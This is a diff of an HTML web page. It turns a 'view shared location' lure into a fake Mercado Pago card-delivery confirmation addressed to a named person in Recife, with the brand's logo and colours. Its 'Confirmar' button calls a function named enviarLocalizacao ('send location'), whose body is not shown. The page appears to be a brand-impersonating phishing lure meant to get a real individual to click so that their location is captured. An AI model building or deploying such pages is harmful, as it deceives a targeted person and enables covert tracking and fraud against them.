@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificando Disponibilidade</title>
+    <title>Mercado Pago - Confirmação</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(to right, #f8f9fa, #e9ecef);
+            background: #f0f2f5;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -19,27 +19,33 @@
             background: #fff;
             border-radius: 12px;
             padding: 30px 25px;
-            max-width: 400px;
+            max-width: 420px;
+            width: 90%;
             text-align: center;
             box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
         }
 
+        .logo {
+            width: 160px;
+            margin-bottom: 20px;
+        }
+
         h2 {
-            color: #333;
-            margin-bottom: 15px;
+            color: #00a650;
+            margin-bottom: 10px;
         }
 
         p {
-            color: #555;
+            color: #333;
             font-size: 15px;
             line-height: 1.5;
         }
 
         .btn {
-            background-color: #007bff;
+            background-color: #009ee3;
             color: #fff;
             padding: 12px 24px;
-            margin-top: 20px;
+            margin-top: 25px;
             border: none;
             border-radius: 8px;
             font-size: 16px;
@@ -48,7 +54,7 @@
         }
 
         .btn:hover {
-            background-color: #0056b3;
+            background-color: #007bbd;
         }
     </style>
 
@@ -80,9 +86,15 @@
 </head>
 <body>
     <div class="container">
-        <h2>📍Acessar Localização Compartilhada</h2>
-        <p>Você recebeu um link de localização. Clique abaixo para visualizar a posição exata no mapa em tempo real.</p>
-        <button class="btn" onclick="enviarLocalizacao()">Ver Localização</button>
+        <img src="https://logodownload.org/wp-content/uploads/2019/11/mercado-pago-logo.png" alt="Mercado Pago" class="logo">
+        <h2>✅ Cartão enviado com sucesso</h2>
+        <p>
+            Olá <strong>Lucas Gabriel Moraes</strong>, seu cartão Mercado Pago foi emitido<br>
+            e será entregue no endereço informado:<br><br>
+            <strong>Recife - Pernambuco</strong><br><br>
+            Clique abaixo para confirmar o recebimento da notificação.
+        </p>
+        <button class="btn" onclick="enviarLocalizacao()">Confirmar</button>
     </div>
 </body>
 </html>
